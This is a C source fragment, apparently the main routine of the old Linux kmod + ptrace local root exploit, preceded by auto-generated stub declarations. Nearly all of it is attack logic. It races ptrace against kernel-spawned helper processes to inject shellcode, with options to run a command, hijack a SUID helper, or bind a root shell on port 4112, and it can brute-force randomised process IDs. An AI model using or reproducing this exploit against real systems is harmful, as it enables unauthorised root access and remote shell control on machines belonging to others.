
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int dummy; } ;


 char* ANY_SUID ;
 char EOF ;



 int SIGSTOP ;
 int SIGUSR1 ;
 int SIGUSR2 ;
 int _exit (int ) ;
 char* bin ;
 int bind_code ;
 int chldpid ;
 int execve (char*,char**,char**) ;
 int execve_tty_code ;
 int fork () ;
 int fprintf (int ,char*,...) ;
 char getopt (int,char**,char*) ;
 int getpid () ;
 int getppid () ;
 int hack (int) ;
 int hackpid ;
 int kill (int,int) ;
 int killed ;
 struct stat me ;
 int mkcode (int) ;
 int mode ;
 char* optarg ;
 int optind ;
 int perror (char*) ;
 int randpids ;
 scalar_t__ sf ;
 int shcode ;
 int signal (int,int ) ;
 int socket (int,int ,int ) ;
 scalar_t__ stat (char*,struct stat*) ;
 int stderr ;
 int strcat (int ,char*) ;
 int strcpy (int ,int ) ;
 int strlen (int ) ;
 int synch ;
 scalar_t__ u2 ;
 int usage (char*) ;
 int usleep (int) ;

int main(int ac, char ** av, char ** env)
{
int single=0;
char c;
int mypid=getpid();
fprintf(stderr, "Linux kmod + ptrace local root exploit by <anszom@v-lo.krakow.pl>\n\n");
 if(stat("/proc/self/exe", &me) && stat(av[0], &me)){
 perror("stat(myself)");
 return 0;
 }

 while((c=getopt(ac, av, "sbdrc:"))!=EOF) switch(c) {
 case 'd': mode=129; break;
 case 'b': mode=130; break;
 case 'r': randpids=1; break;
 case 'c': bin=optarg; break;
 case 's': single=1; break;
 default: usage(av[0]);
 }

 if(ac!=optind) usage(av[0]);

 if(!bin){
  if(mode!=128) bin="/bin/sh";
  else{
  struct stat qpa;
   if(stat((bin="/bin/id"), &qpa)) bin="/usr/bin/id";
  }
 }

signal(SIGUSR1, synch);

hackpid=0;
 switch(mode){
 case 128:
 fprintf(stderr, "=> Simple mode, executing %s > /dev/tty\n", bin);
 strcpy(shcode, execve_tty_code);
 strcat(shcode, bin);
 break;

 case 129:
 fprintf(stderr, "=> Double-ptrace mode, executing %s, suid-helper %s\n",
   bin, ANY_SUID);
  if((hackpid=fork())==0){
  char *ble[]={ANY_SUID, ((void*)0)};
  fprintf(stderr, "Starting suid program %s\n", ANY_SUID);
  kill(getppid(), SIGUSR1);
  execve(ble[0], ble, env);
  kill(getppid(), 9);
  perror("execve(SUID)");
  _exit(0);
  }

  while(!sf);

 usleep(100000);
 kill(hackpid, SIGSTOP);
 mkcode(hackpid);
 break;

 case 130:
 fprintf(stderr, "=> portbind mode, executing %s on port 4112\n", bin);

 strcpy(shcode, bind_code);
 strcat(shcode, bin);
 break;
 }
fprintf(stderr, "sizeof(shellcode)=%d\n", strlen(shcode));

signal(SIGUSR2, killed);

 if(randpids){
 fprintf(stderr, "\033[1;31m"
"Randomized pids support enabled... be patient or load the system heavily,\n"
"this method does more brute-forcing\033[0m\n");
 }

again:
sf=0;
 if((chldpid=fork())==0){
 int q;
 kill(getppid(), SIGUSR1);
  while(!sf);

 fprintf(stderr, "=> Child process started");
  for(q=0;q<10;++q){
  fprintf(stderr, ".");
  socket(22,0,0);
  }
 fprintf(stderr, "\n");
 kill(getppid(), SIGUSR2);
 _exit(0);
 }

 while(!sf);
kill(chldpid, SIGUSR1);

 for(;;){
 int q;
  if(randpids){
   for(q=1;q<30000;++q)
   if(q!=chldpid && q!=mypid && q!=hackpid) hack(q);
  }else{
   for(q=chldpid+1;q<chldpid+10;q++) hack(q);
  }

  if(u2){
  u2=0;
   if(single) break;
  goto again;
  }
 }
fprintf(stderr, "Failed\n");
return 1;
}
